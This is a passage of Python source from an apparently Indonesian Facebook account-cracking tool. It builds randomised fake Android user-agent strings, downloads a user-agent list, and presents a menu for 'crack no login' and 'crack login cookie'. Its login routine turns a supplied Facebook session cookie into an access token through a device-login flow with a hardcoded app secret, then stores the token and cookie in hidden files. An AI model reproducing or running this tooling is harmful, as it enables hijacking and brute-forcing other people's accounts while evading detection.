	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Lenovo TB-X606X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 OPR/68.3.3557.64528'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)#ffffff
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi Note 9 Pro)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['V2111 Build/SP1A.210812.003; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['JNY-LX2 Build/HUAWEIJNY-L22; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['HLK-AL00 Build/HONORHLK-AL00; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Lenovo TB-X606X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 OPR/68.3.3557.64528'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 3)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen2.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
domris = random.choice(['bold blue','bold green','bold yellow'])

try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FF00"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

hour = datetime.datetime.now().hour
#--> Pengkondisian Jam Untuk Salam Harian
if hour < 4:
  hhl = f"Selamat Dini Hari"
elif 4 <= hour < 12:
  hhl = f"Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Pagi"
elif 15 <= hour < 17:
  hhl = f"Selamat Sore"
elif 17 <= hour < 18:
  hhl = f"Selamat Sore"
else:
  hhl = f"Selamat Malam"
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	loginraf()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	cetak(nel(f'''{K2}   _______  ____________  ____  ____  __ __
  / __/ _ |/ ___/ __/ _ )/ __ \/ __ \/ //_/    {P2}RECODE BY {K2}RAF MKZ 
 / _// __ / /__/ _// _  / /_/ / /_/ / ,<   {P2}THANKS TO {K2}ALVINO ADIJAYA 
/_/ /_/ |_\___/___/____/\____/\____/_/|_|  
         TOOLS BFF V2.4.4                                   ''',width=79,title=f'[bold green]BANNER',style='bold hot_pink2'))
#--------------------[ BAGIAN-MASUK ]--------------#
import requests,json,re
ses = requests.Session()
def loginraf():
	clear()
	banner()
	tree = Tree(' ')
	tree.add(f'[bold green]1. [bold white] CRACK NO LOGIN')
	tree.add(f'[bold green]2. [bold white] CRACK LOGIN COOKIE') 
   # tree.add(f'{h}2. {P} CRACK LOGIN COOKIE')
	tree.add(f'[bold green]0. [bold white] EXIT')
	cetak(nel(tree, width=79, title=f'[bold green]MENU UTAMA', style="bold hot_pink2")) 
	RAF_MKZ = input(f'{M} ╰─ {P}PILIH : ')
	if RAF_MKZ in ['1','01']:
		lainnya()
	if RAF_MKZ in ['2','02']:
		login()
	elif RAF_MKZ in ['0','00']:
		exit()
	else :
		print(f'╰─ PILIH YG BENAR BANG')
		time.sleep(5)
		back()

def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		your_cookies = input(' ╰─  Masukan Cookie : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n ╰─  Login Berhasil | Jalankan ulang Script nya");exit()

			except Exception as e:

				print(" ╰─  Cookies Mokad bang")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
#------------------[ BAGIAN-MENU ]----------------#
from rich.console import Console
from rich.table import Table
def menu(my_name,my_id):
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
		
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	table=Table()
	table.add_column("NO",width=11,justify="center",style="green")
	table.add_column("MENU",justify="center",width=43,style= "green")
	table.add_column("STATUS",justify="center",width=11,style="green")
